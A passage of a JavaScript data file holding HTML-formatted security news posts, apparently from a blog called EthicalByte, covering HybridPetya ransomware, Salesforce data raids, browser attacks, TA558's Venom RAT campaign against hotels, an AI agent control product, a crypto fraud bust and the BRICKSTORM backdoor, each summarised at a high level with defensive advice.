        While provenance won’t eliminate deception overnight, it gives platforms and users a verifiable signal that can greatly reduce misinformation and abuse of synthetic media.  
        For organizations, the near-term priority is to integrate provenance checks, preserve metadata, and combine cryptographic signals with smart content analysis.
      </p>
    </section>
  `},{id:"hybridpetya-ransomware-2025",title:"HybridPetya: The Ransomware That Breaks Secure Boot",summary:"A new strain bypasses UEFI protections, encrypts entire systems, and demands $1,000 in Bitcoin",date:"2025-09-14",author:"EthicalByte",tags:["Ransomware","HybridPetya","UEFI","Secure Boot","Malware"],imageKey:"hybridPetyaBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#1b2735,#090a0f); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff5252;">⚠ HybridPetya — A Ransomware Evolution</h3><br>
      <p>
        A new ransomware strain, <b>HybridPetya</b>, has emerged with a chilling capability: it can 
        <b>bypass Secure Boot protections</b> on modern PCs and embed itself into the <b>UEFI firmware</b>.  
        Victims are shown a fake <b>CHKDSK repair screen</b> before being hit with a <b>$1,000 Bitcoin demand</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c5364,#203a43); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffca28;">🔑 How HybridPetya Works</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🖥 Exploits <b>Secure Boot vulnerabilities</b> to execute before the OS loads</li>
        <li>⚡ Infects the <b>UEFI firmware</b>, ensuring persistence beyond reinstalls</li>
        <li>🔒 Encrypts entire drives — not just files — leaving systems unusable</li>
        <li>💰 Displays ransom note demanding <b>$1,000 in Bitcoin</b></li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#90caf9;">🚨 Why This Threat Is Alarming</h3><br>
      <p>
        Traditional ransomware encrypts files after boot. <b>HybridPetya goes deeper</b> — it hijacks  
        the system before the operating system even starts, making recovery nearly impossible.  
        Security researchers warn that <b>Secure Boot bypass attacks are becoming more frequent</b>, 
        signaling a dangerous new era of ransomware evolution.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#1565c0;">🛡 Defenses Against HybridPetya</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Keep <b>firmware and BIOS</b> updated to patch Secure Boot vulnerabilities</li>
        <li>✅ Enable <b>hardware-based security features</b> like TPM</li>
        <li>✅ Use <b>advanced endpoint protection</b> with firmware scanning</li>
        <li>✅ Maintain <b>offline, encrypted backups</b> to recover without paying</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#090a0f,#1b2735); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff5252;">💀 Final Thoughts</h3><br>
      <p>
        <b>HybridPetya</b> represents a new class of ransomware — one that attacks the very foundation of your system.  
        With Secure Boot and UEFI under siege, <b>prevention is critical</b>. Once infected, even wiping the OS may not be enough.  
        This is not just ransomware — it’s <b>ransomware redefined</b>.
      </p>
    </section>
  `},{id:"fbi-salesforce-raids-2025",title:"FBI Warns: Hackers Raiding Salesforce to Steal Data",summary:"UNC6040, UNC6395, and known groups like ShinyHunters, LAPSUS$, and Scattered Spider are behind the campaigns.",date:"2025-09-15",author:"EthicalByte",tags:["FBI Alert","Salesforce Breach","Token Theft","Phishing","Cybercrime Groups"],imageKey:"fbiSalesforceBreach",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141E30,#243B55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d4d;">🚨 FBI Alert: Salesforce Under Siege</h3><br>
      <p>
        The FBI has issued a new warning about <b>ongoing Salesforce data raids</b>, carried out by advanced 
        threat actors <b>UNC6040</b> and <b>UNC6395</b>. Using <b>stolen tokens, phishing calls, and custom malware</b>, 
        these hackers are breaching enterprise Salesforce instances to steal sensitive data and extort victims.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#232526,#414345); border-radius:12px; color:#eaeaea; margin-top:15px;">
      <h3 style="color:#ffca28;">🕵️ The Threat Actors</h3><br>
      <p>
        Investigators have tied the activity to cybercrime collectives including <b>ShinyHunters</b>, <b>LAPSUS$</b>, 
        and <b>Scattered Spider</b>. These groups briefly announced their "retirement," but the FBI cautions that such 
        claims are rarely trustworthy. Instead, they may be reorganizing and evolving their operations.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#000428,#004e92); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#90caf9;">⚙️ How the Attacks Work</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 Theft of <b>OAuth tokens</b> to gain persistent access</li>
        <li>📞 <b>Phishing calls</b> to trick employees into handing over credentials</li>
        <li>🛠 <b>Custom exploitation tools</b> tailored for Salesforce environments</li>
        <li>📤 Large-scale data exfiltration followed by extortion attempts</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#ddd; margin-top:15px;">
      <h3 style="color:#34d399;">🌍 Impact on Organizations</h3><br>
      <p>
        The raids are not just about stolen customer data — they also compromise <b>licensing details</b>, 
        <b>support case text</b>, and other sensitive business information. This enables attackers to not only extort 
        companies but also weaponize stolen insights against customers and partners.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Rotate and monitor <b>OAuth tokens</b> regularly</li>
        <li>✔️ Enable <b>multi-factor authentication (MFA)</b> across Salesforce accounts</li>
        <li>✔️ Train employees to detect <b>phishing attempts</b> over calls & emails</li>
        <li>✔️ Monitor for <b>unusual API calls or large data exports</b></li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#243B55,#141E30); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d4d;">⚡ Final Thoughts</h3><br>
      <p>
        The FBI’s warning makes one thing clear: <b>retired hacker groups don’t retire</b>.  
        They rebrand, regroup, and return stronger.  
        Enterprises must strengthen defenses around SaaS platforms like Salesforce — because attackers know 
        this is where the crown jewels are kept.
      </p>
    </section>
  `},{id:"browser-attacks-rising-2025",title:"Browser Attacks Surge as Hackers Exploit the Weakest Link",summary:"From MFA-bypassing phishing kits to malicious extensions — your browser is the new frontline.",date:"2025-09-16",author:"EthicalByte",tags:["Browser Security","Phishing","Malware","MFA Bypass","Cyber Threats"],imageKey:"browserAttacks2025Banner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141e30,#243b55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff9800;">🚨 Browsers Under Siege</h3><br>
      <p>
        Cybersecurity researchers are raising alarms as <b>browser-based attacks</b> skyrocket in 2025.  
        From <b>Snowflake</b> to <b>Salesforce</b>, attackers are exploiting the browser as their new weapon of choice —  
        bypassing security controls, stealing data, and planting malware.  
        The humble browser has become the <b>weakest link in enterprise defense</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a1a,#333333); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#03a9f4;">🛑 Key Tactics Attackers Use</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🎣 <b>Phishing Kits</b> — Fake login pages that bypass multi-factor authentication (MFA).</li>
        <li>⚡ <b>ClickFix Attacks</b> — Tricks users into clicking prompts that execute hidden malware.</li>
        <li>🧩 <b>Malicious Extensions</b> — Trojanized browser add-ons that sneak past official web stores.</li>
      </ul>
      <p>
        These methods exploit human trust and browser permissions — not just software vulnerabilities.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#2c5364); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#4caf50;">🌍 Real-World Impact</h3><br>
      <p>
        Security teams are reporting <b>massive data breaches</b> linked to browser attacks.  
        Compromised sessions give attackers access to corporate SaaS platforms,  
        cloud dashboards, and even financial systems.  
        In several cases, attackers bypassed traditional security solutions completely by <b>living inside the browser</b>.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#d32f2f;">🛡️ Defense Against Browser Attacks</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Deploy <b>browser isolation</b> and zero-trust browsing solutions.</li>
        <li>✔️ Restrict <b>browser extensions</b> to pre-approved, verified add-ons.</li>
        <li>✔️ Train employees to recognize <b>ClickFix prompts</b> and fake login flows.</li>
        <li>✔️ Monitor <b>session hijacking</b> and anomalous logins across SaaS platforms.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#243b55,#141e30); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff9800;">✅ Final Thoughts</h3><br>
      <p>
        The browser is no longer just a tool — it’s the <b>primary attack surface</b>.  
        As phishing kits evolve and malicious extensions multiply,  
        organizations must rethink browser security as a <b>core part of cyber defense</b>.  
        In 2025, <b>your biggest breach may start with just one click</b>.
      </p>
    </section>
  `},{id:"ai-agent-security-astrix-2025",title:"Securing the Agentic Era: Astrix Launches AI Agent Control Plane",summary:"As AI agents outnumber employees 100:1, Astrix steps in to protect companies from invisible risks",date:"2025-09-17",author:"EthicalByte",tags:["AI Agents","Cybersecurity","Identity Security","Astrix","Automation Risks"],imageKey:"aiAgentControlBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🚨 The AI Identity Crisis</h3><br>
      <p>
        A staggering <b>80% of companies</b> have already faced <b>AI agent mishaps</b> — from unauthorized access 
        to accidental data leaks. The problem? <b>Non-human identities</b> such as bots, service accounts, and AI agents 
        now outnumber human employees <b>100:1</b>.  
        Without visibility and control, organizations are sleepwalking into a massive security gap.
      </p>
      <p>
        Unlike human users, these agents operate 24/7, make autonomous decisions, and often interact with sensitive 
        APIs and databases. That means even a single misconfigured or compromised agent could cause 
        <b>damage at machine speed</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧩 Why Traditional Security Fails</h3><br>
      <p>
        Firewalls and MFA protect <b>humans</b>, but they aren’t built for <b>autonomous AI agents</b> operating 
        inside networks, apps, and APIs.  
        These agents can create hidden risks by <b>sharing sensitive data, misusing privileges, 
        or executing tasks without oversight</b>.
      </p>
      <p>
        Traditional IAM (Identity & Access Management) tools simply can’t keep up with 
        the <b>scale, speed, and invisibility</b> of agent-to-agent interactions. 
        This gap has become the new frontier for attackers.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🔑 Astrix’s AI Agent Control Plane</h3><br>
      <p>
        Astrix has launched the <b>world’s first AI Agent Control Plane</b>, a dedicated platform for 
        securing non-human identities.  
        Key features include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Visibility</b> into every AI agent and service account across the enterprise</li>
        <li>✅ <b>Policy enforcement</b> for limiting data access and privileges</li>
        <li>✅ <b>Real-time monitoring</b> to catch suspicious AI behavior before damage occurs</li>
        <li>✅ <b>Automated remediation</b> for instantly revoking risky permissions</li>
      </ul>
      <p>
        This isn’t just security for today — it’s infrastructure for the <b>next decade of automation</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚡ Why It Matters</h3><br>
      <p>
        As companies rush into the <b>agentic era</b>, the risks posed by autonomous AI systems will only grow.  
        Without guardrails, AI agents can expose organizations to <b>compliance failures, insider threats, 
        and large-scale breaches</b>.
      </p>
      <p>
        Remember — it’s not just about stopping external hackers.  
        The danger comes from inside, where AI agents <b>already have permissions and authority</b>.  
        Astrix provides a much-needed safety net for enterprises adopting AI at scale.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">✅ Final Thoughts</h3><br>
      <p>
        The security perimeter has shifted — from people to <b>agents</b>.  
        Organizations must treat AI identities with the same rigor as human ones.  
        The Astrix AI Agent Control Plane might just become the blueprint for <b>AI-era identity security</b>.
      </p>
      <p>
        In short: if you’re deploying AI at scale without agent identity controls, 
        you’re not just unprepared — you’re already <b>exposed</b>.
      </p>
    </section>
  `},{id:"ta558-venom-revengehotels-2025",title:"Venom RAT & LLM Phishing: TA558 Targets Hotels to Steal Guest Data",summary:"RevengeHotels (TA558) uses AI-written phishing in Spanish/Portuguese to deliver Venom RAT that steals cards, kills Defender & spreads via USB.",date:"2025-09-18",author:"EthicalByte",tags:["TA558","Venom RAT","Hotel Security","LLM Phishing","Payment Card Theft","USB Spread"],imageKey:"venomHotelBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#041726,#0b3a4a); border-radius:12px; color:#eef8ff;">
      <h3 style="color:#ff7a59;">🏨 AI-driven Hotel Attacks: Venom RAT on the Move</h3><br>
      <p>
        A cybercrime group tracked as <b>TA558 (aka RevengeHotels)</b> has launched targeted attacks against hotels across the region using <b>LLM-generated phishing emails in Portuguese and Spanish</b>. 
        The lure is tailored to hospitality staff and contractors — realistic, localized messages that bypass normal suspicion.
      </p>
      <p>
        The payload: <b>Venom RAT</b> — a $650 commodity remote-access trojan that steals guest credit-card data, disables Microsoft Defender, and can propagate via removable media (USB). 
        The combination of AI-written social engineering and a cheap, effective RAT makes this campaign both scalable and dangerous.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0e3a47,#073241); border-radius:12px; color:#dff6ff; margin-top:15px;">
      <h3 style="color:#ffd166;">⚙️ How the Campaign Operates</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✉️ <b>LLM-crafted phishing emails</b> in native languages to increase click-through and reduce suspicion</li>
        <li>📎 Malicious attachments or links that drop the Venom RAT downloader</li>
        <li>🛡 Venom RAT disables Windows Defender/AV to avoid detection and maintain persistence</li>
        <li>🔌 Lateral spread via <b>infected USB drives</b> (especially dangerous in hospitality where USBs are commonly used for devices and kiosks)</li>
        <li>💳 Targeted exfiltration of POS and guest payment card data for resale or fraud</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#072b36,#0d2130); border-radius:12px; color:#e8fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🔍 Why Hotels Are an Attractive Target</h3><br>
      <p>
        Hotels hold a high density of payment card transactions, third-party vendors, and transient devices — a perfect storm for attackers:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>High volume of cardholder data passing through POS systems and reservations platforms</li>
        <li>Frequent use of removable media, kiosks, and shared workstations</li>
        <li>Multiple third-party integrations (cleaning, catering, booking platforms) that increase the attack surface</li>
        <li>Often limited cybersecurity staffing and variable patching practices across properties</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#14323b,#09252b); border-radius:12px; color:#e8fbff; margin-top:15px;">
      <h3 style="color:#ffb86b;">🛡️ Immediate Mitigations (What Hotels Must Do Now)</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ <b>Harden endpoints:</b> enforce EDR with tamper-protection and block known Venom RAT indicators</li>
        <li>✔️ <b>Preserve AV integrity:</b> prevent unauthorized disabling of Defender via policy and monitoring</li>
        <li>✔️ <b>Lock down removable media:</b> implement USB allowlisting or disable autorun and unneeded USB ports</li>
        <li>✔️ <b>Segment POS systems:</b> isolate payment environments from general corporate networks and guest Wi-Fi</li>
        <li>✔️ <b>Language-aware phishing training:</b> simulate local-language phishing and train staff to spot LLM-crafted messages</li>
        <li>✔️ <b>Vendor security checks:</b> vet third-party integrations and enforce least privilege for vendor accounts</li>
      </ul>
      <p>
        Prioritize rapid detection and containment: in Venom RAT incidents, early isolation of infected hosts and credential resets reduce downstream exposure.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#06202a,#04161d); border-radius:12px; color:#dff8ff; margin-top:15px;">
      <h3 style="color:#ffd166;">📈 Longer-Term Controls</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔐 Adopt strong MFA and short-lived API keys for all vendor/service accounts</li>
        <li>🔎 Implement continuous threat hunting focused on lateral movement and USB-based spread patterns</li>
        <li>🧾 Maintain robust logging and centralized SIEM to detect odd processes or Defender tampering</li>
        <li>🤝 Share IoCs and attack patterns with hospitality sector peers and CERTs</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#08161b,#0b2a33); border-radius:12px; color:#eefbff; margin-top:15px;">
      <h3 style="color:#ff7a59;">✅ Final Take</h3><br>
      <p>
        TA558’s campaign is an example of how cheap commodity malware + LLM social engineering creates a highly scalable threat to the hospitality industry.  
        Hotels must treat AI-crafted social engineering as a real operational risk and lock down endpoints, removable media, and payment environments — fast.
      </p>
      <p style="font-size:0.9em; color:#bcdbe6;">Source: TheHackerNews — https://thehackernews.com/2025/09/ta558-uses-ai-generated-scripts-to.html</p>
    </section>
  `},{id:"ai-quantum-cybersecurity-2025",title:"AI + Quantum: The Next Frontier in Cybersecurity",summary:"Great potential, greater risks — experts warn of a new era of cyber challenges",date:"2025-09-19",author:"EthicalByte",tags:["AI","Quantum Computing","Cybersecurity","Webinar","Future Tech"],imageKey:"aiQuantumCyberBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🤖⚛ When AI Meets Quantum</h3><br>
      <p>
        AI and Quantum Computing are converging to reshape technology — and cybersecurity is at the heart of this evolution.  
        Together, they promise breakthroughs in <b>drug discovery, logistics, encryption, and national security</b>.  
        But they also introduce a whole new category of <b>unpredictable risks</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#f0f0f0; margin-top:15px;">
      <h3 style="color:#ffca28;">🔑 The Dual-Edged Sword</h3><br>
      <p>
        While Quantum can <b>crack today’s encryption</b>, it can also power the <b>next generation of quantum-safe cryptography</b>.  
        Meanwhile, AI amplifies both sides — accelerating defenses but also helping attackers build smarter exploits, faster phishing campaigns, and <b>adaptive malware</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#28313b,#485563); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#90caf9;">🌍 Why It Matters</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚡ Quantum may render RSA & ECC obsolete within the decade.</li>
        <li>🤖 AI-driven attackers can weaponize deepfakes, zero-days, and automated social engineering.</li>
        <li>🔐 Together, AI + Quantum redefine <b>trust, privacy, and digital resilience</b>.</li>
      </ul>
    </section>


    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#00e5ff;">✅ Final Thoughts</h3><br>
      <p>
        The AI + Quantum revolution is here.  
        It holds <b>incredible potential</b> but also opens the door to <b>unprecedented risks</b>.  
        The only way forward is to stay informed, build resilience, and prepare for a future where <b>trust is quantum-proof</b>.
      </p>
    </section>
  `},{id:"sap-sovereign-cloud-india-2025",title:"SAP Launches Sovereign Cloud in India to Boost Digital Future",summary:"Empowering governments and enterprises with data sovereignty, compliance, and AI-ready infrastructure for a self-reliant digital future.",date:"2025-09-22",author:"EthicalByte",tags:["SAP","Sovereign Cloud","India","Data Sovereignty","Cloud Security","Digital Transformation"],imageKey:"sapSovereignCloudIndia",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#002b36,#003f5c); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">🇮🇳 A Big Leap in Digital Sovereignty</h3><br>
      <p>
        SAP has officially launched its <b>Sovereign Cloud in India</b>, a major milestone in the nation’s push toward 
        <b>digital self-reliance</b>. This cloud infrastructure ensures that <b>critical data stays within Indian borders</b>, 
        addressing concerns around data sovereignty, compliance, and resilience.  
      </p>
      <p>
        By combining <b>local data control</b> with global cloud innovation, SAP is enabling India to build a secure, 
        future-ready digital backbone that aligns with national priorities.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1c1c1c,#434343); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffca28;">☁ What Makes It Different?</h3><br>
      <p>
        The Sovereign Cloud goes beyond traditional hosting solutions. It introduces:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Data residency</b>: Information is fully processed and stored within India’s jurisdiction.</li>
        <li>✅ <b>Flexible deployments</b>: Options include on-premise, trusted partners, and hyperscalers like AWS — but always under Indian law.</li>
        <li>✅ <b>Regulatory alignment</b>: Compliant with India’s <b>DPDP Act</b> and sector-specific regulations.</li>
        <li>✅ <b>AI-ready foundation</b>: Designed to support next-gen technologies like <b>AI, ML, and analytics</b> securely.</li>
      </ul>
      <p>
        This positions India as one of the first countries to combine sovereignty with <b>cutting-edge innovation at scale</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🔑 Why Sovereign Cloud Matters</h3><br>
      <p>
        In today’s interconnected world, <b>data is power</b>. With rising cyber threats, foreign surveillance risks, 
        and increasing compliance demands, <b>keeping sensitive data within borders</b> has become a necessity.  
      </p>
      <p>
        Sovereign Cloud provides governments, enterprises, and regulators with the confidence that their 
        <b>critical data is secure, compliant, and locally controlled</b>.  
        This is crucial in industries like <b>finance, healthcare, energy, and defense</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🌍 Real-World Impact</h3><br>
      <p>
        SAP’s Sovereign Cloud in India is more than just infrastructure — it’s a <b>national enabler</b>:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🏛 <b>Governments</b>: Ensure e-governance data remains in-country, supporting citizen trust.</li>
        <li>💳 <b>Financial sector</b>: Protect sensitive banking records, payment data, and ensure RBI compliance.</li>
        <li>🏥 <b>Healthcare</b>: Store and analyze patient data securely while enabling AI-powered diagnostics.</li>
        <li>🏭 <b>Enterprises</b>: Accelerate digital transformation without fear of compliance failures.</li>
      </ul>
      <p>
        Together, these capabilities strengthen <b>India’s position as a global digital leader</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">🚀 Final Thoughts</h3><br>
      <p>
        With the launch of <b>SAP Sovereign Cloud in India</b>, the country is taking a decisive step toward 
        <b>digital sovereignty</b>.  
        By blending global innovation with <b>local trust and compliance</b>, India is ensuring its digital economy 
        is <b>resilient, future-proof, and secure</b>.  
      </p>
      <p>
        This is not just about technology — it’s about <b>empowering India’s digital future</b>.
      </p>
    </section>
  `},{id:"autonomous-ai-cybersecurity-2025",title:"Agents Of Change: The Rise Of Autonomous AI In Cybersecurity",summary:"Autonomous AI systems are reshaping cybersecurity by analyzing data at scale, detecting patterns, and responding in real time to evolving threats.",date:"2025-09-23",author:"EthicalByte",tags:["Autonomous AI","Cybersecurity","Threat Detection","AI Security","Future Tech"],imageKey:"autonomousAICyberBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#00e5ff;">⚡ A New Era of Defense</h3><br>
      <p>
        Autonomous AI systems are no longer experimental — they are becoming the <b>core of modern cybersecurity</b>.  
        Unlike traditional tools that rely on human response times, these systems can <b>analyze massive datasets instantly</b>, 
        detect subtle anomalies, and respond to threats at <b>machine speed</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🔑 What Makes It Different</h3><br>
      <p>
        Human security teams can only scale so far.  
        Autonomous AI augments their capabilities by:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ <b>Analyzing vast amounts of telemetry data</b> in real time</li>
        <li>✅ <b>Identifying attack patterns</b> invisible to the human eye</li>
        <li>✅ <b>Responding instantly</b> before attackers can escalate</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🌍 Real-World Impact</h3><br>
      <p>
        From <b>banking systems</b> to <b>critical infrastructure</b>, autonomous AI is already 
        helping organizations stay ahead of <b>sophisticated cyber attacks</b>.  
        With threat actors adopting AI themselves, this technology has shifted from 
        an innovation to a <b>necessity</b>.
      </p>
      <p>
        PwC research highlights how <b>AI + cybersecurity</b> are converging to redefine risk management and resilience.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚡ Why It Matters</h3><br>
      <p>
        As <b>quantum computing</b>, <b>autonomous agents</b>, and <b>AI-driven malware</b> emerge,  
        organizations must embrace autonomous AI not just as a tool, but as a <b>strategic shield</b>.  
        Without it, defenders risk falling behind in an arms race that is accelerating every day.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">✅ Final Thoughts</h3><br>
      <p>
        Cybersecurity is no longer about reacting — it’s about <b>predicting and preventing</b>.  
        Autonomous AI marks a turning point, where defense systems don’t just wait for alerts,  
        they <b>act first</b>.  
        This is the future of safeguarding digital assets and infrastructure.
      </p>
    </section>
  `},{id:"europe-crypto-scam-bust-2025",title:"Europe Cracks Down on €100M Crypto Scam",summary:"A multinational crackdown exposes a crypto fraud ring spanning 23 countries, marking one of Europe’s largest financial cybercrime busts.",date:"2025-09-24",author:"EthicalByte",tags:["Crypto Scam","Fraud","Cybercrime","Europe","Eurojust"],imageKey:"europeCryptoScam2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#141E30,#243B55); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 €100M Crypto Scam Exposed</h3><br>
      <p>
        A coordinated European investigation has <b>brought down a crypto scam worth €100 million</b>.  
        Since 2018, five suspects orchestrated a sophisticated fraud scheme, luring victims in  
        <b>23 different countries</b> with the promise of guaranteed investment returns—before  
        disappearing with their money.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#232526,#414345); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">💰 Inside the Fraud Operation</h3><br>
      <p>
        The criminals created <b>fake investment platforms</b> designed to look legitimate,  
        convincing victims to deposit large sums. Once the money was transferred,  
        the platforms vanished—along with the criminals behind them.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📉 False promises of “guaranteed profits”</li>
        <li>🌍 Victims spread across Europe and beyond</li>
        <li>⛔ Criminals vanished after cashing out deposits</li>
      </ul>
      <p>
        Authorities confirmed <b>five arrests</b> in a joint Europol-Eurojust operation.  
        Bank accounts and assets tied to the scam have already been frozen.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f2027,#2c5364); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🌍 Why This Bust Matters</h3><br>
      <p>
        This crackdown is one of <b>Europe’s largest crypto fraud takedowns</b>,  
        proving how global cooperation is vital against cross-border financial cybercrime.  
        Thousands of victims can now see justice as assets are recovered and operations dismantled.  
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#fafafa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🚀 Lessons Learned</h3><br>
      <p>
        If an investment promises <b>risk-free high returns</b>, it’s almost always a scam.  
        This case highlights the importance of <b>financial awareness and vigilance</b> in an age  
        where fraudsters exploit global trust in digital platforms.
      </p>
    </section>
  `},{id:"brickstorm-backdoor-unc5221-2025",title:"BRICKSTORM Backdoor: China-Linked Hackers Breach U.S. Firms",summary:"UNC5221 (China-linked actors) used a stealthy backdoor called BRICKSTORM to infiltrate legal, SaaS and tech firms — hiding for 393 days while exfiltrating emails and cloning servers.",date:"2025-09-25",author:"EthicalByte",tags:["UNC5221","BRICKSTORM","Advanced Persistent Threat","Backdoor","Data Exfiltration","Supply Chain"],imageKey:"brickstormBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#071024,#0e2740); border-radius:12px; color:#eef6fb;">
      <h3 style="color:#ff6b6b;">🚨 BRICKSTORM: Stealthy 393-Day Intrusion</h3><br>
      <p>
        Security researchers have uncovered a long-running intrusion by a group tracked as <b>UNC5221</b>, leveraging a custom backdoor named <b>BRICKSTORM</b>.  
